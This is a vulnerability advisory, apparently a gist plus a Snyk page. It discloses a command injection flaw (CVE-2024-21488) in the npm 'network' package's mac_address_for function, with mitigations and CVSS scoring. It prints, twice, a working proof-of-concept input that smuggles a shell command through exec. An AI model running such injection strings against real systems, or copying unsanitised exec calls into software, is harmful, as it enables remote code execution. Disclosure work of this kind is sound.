Vulnerability found in NPM package - network

 [Raw](/icemonster/282ab98fb68fc22aac7c576538f6369c/raw/7aa0c5a06bd9c53e666dbf872088baac934d1c3d/network.md)

[**network.md**](#file-network-md)

## ACI in network

### Package source

* <https://www.npmjs.com/package/network>

### Github repo

* <https://github.com/tomas/network>

### Package description

Cross platform network utilities for Node.js (gateway\_ip, MAC address, etc)

### Vulnerability Overview

Affected versions of this package are vulnerable to arbitrary command injection (CWE-77 [1]).

If (attacker-controlled) user input is given to the `mac_address_for` function of the package, it is possible for an attacker to execute arbitrary commands on the operating system that this package is being run on.

This vulnerability is due to use of the `child_process` `exec` function without input sanitization. The Node.js API documentation states that unsanitized user input should never be passed to `exec` [2].

[1] <https://cwe.mitre.org/data/definitions/77.html>

[2] <https://nodejs.org/api/child_process.html#child_process_child_process_exec_command_options_callback>

### Reproduction

The proof-of-concept code below illustrates the issue. Executing this code will cause the command `touch /tmp/success` to be executed, leading to the creation of a file called `success` in the `/tmp` directory.

```
var PUT = require('network');
var x0 = " $(touch /tmp/success) # \" || touch /tmp/success # ' || touch /tmp/success";
var x1 = "{}";
new PUT["mac_address_for"](x0,x1);
```

Environment: Node.js v15.5.0 on Linux

Steps to reproduce:

1. `npm i network@0.6.1`
2. Create a file, `poc.js`, containing the PoC code.
3. Execute the file: `node poc.js`

A file called `success` will be created in the `tmp` directory as a result of the execution of the PoC.

## Mitigation

* Consider using `execFile` [1] or `execFileSync` [2] if possible, which do not spawn a shell.
* If possible, consider only passing inputs to `exec` that match a predefined allow-list.
* If using an allow-list is not possible, consider sanitizing inputs to `exec` such that they do not contain shell meta-characters such as `$()`.

### Threat Intelligence

Exploit Maturity

Snyk has a proof-of-concept or detailed explanation of how to exploit this vulnerability.

Proof of conceptEPSS

The probability is the direct output of the EPSS model, and conveys an overall sense of the threat of
exploitation in the wild. The percentile measures the EPSS probability relative to all known EPSS scores.
Note: This data is updated daily, relying on the latest available EPSS model version.

#### Introduced: 23 Jan 2024

[CVE-2024-21488  (opens in a new tab)](https://www.cve.org/CVERecord?id=CVE-2024-21488) Common Vulnerabilities and Exposures (CVE) are common identifiers for publicly known security vulnerabilities[CWE-77  (opens in a new tab)](https://cwe.mitre.org/data/definitions/77.html) Common Weakness Enumeration (CWE) is a category system for software weaknesses First added by Snyk
## How to fix?

Upgrade `network` to version 0.7.0 or higher.

## Overview

[network](https://www.npmjs.com/package/network) is a the missing network utilities in Node.js.

Affected versions of this package are vulnerable to Arbitrary Command Injection due to use of the `child_process` `exec` function without input sanitization. If (attacker-controlled) user input is given to the `mac_address_for` function of the package, it is possible for the attacker to execute arbitrary commands on the operating system that this package is being run on.

## PoC

```
var PUT = require('network');
var x0 = " $(touch /tmp/success) # \" || touch /tmp/success # ' || touch /tmp/success";
var x1 = "{}";
new PUT["mac_address_for"](x0,x1);

```

### CVSS Scores

version 3.1
### Snyk

7.3 high

* Attack Vector (AV)

  The vulnerable component is bound to the network stack and the set of possible attackers extends beyond the other options listed below, up to and including the entire Internet. Such a vulnerability is often termed “remotely exploitable” and can be thought of as an attack being exploitable *at the protocol level* one or more network hops away (e.g., across one or more routers).

  **Network**
* Attack Complexity (AC)

  Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success when attacking the vulnerable component.

  **Low**
* Privileges Required (PR)

  The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files of the vulnerable system to carry out an attack.

  **None**
* User Interaction (UI)

  The vulnerable system can be exploited without interaction from any user.

  **None**

* Scope (S)

  An exploited vulnerability can only affect resources managed by the same security authority. In this case, the vulnerable component and the impacted component are either the same, or both are managed by the same security authority.

  **Unchanged**

* Confidentiality (C)

  There is some loss of confidentiality. Access to some restricted information is obtained, but the attacker does not have control over what information is obtained, or the amount or kind of loss is limited. The information disclosure does not cause a direct, serious loss to the impacted component.

  **Low**
* Integrity (I)

  Modification of data is possible, but the attacker does not have control over the consequence of a modification, or the amount of modification is limited. The data modification does not have a direct, serious impact on the impacted component.

  **Low**
* Availability (A)

  Performance is reduced or there are interruptions in resource availability. Even if repeated exploitation of the vulnerability is possible, the attacker does not have the ability to completely deny service to legitimate users. The resources in the impacted component are either partially available all of the time, or fully available only some of the time, but overall there is no direct, serious consequence to the impacted component.

  **Low**
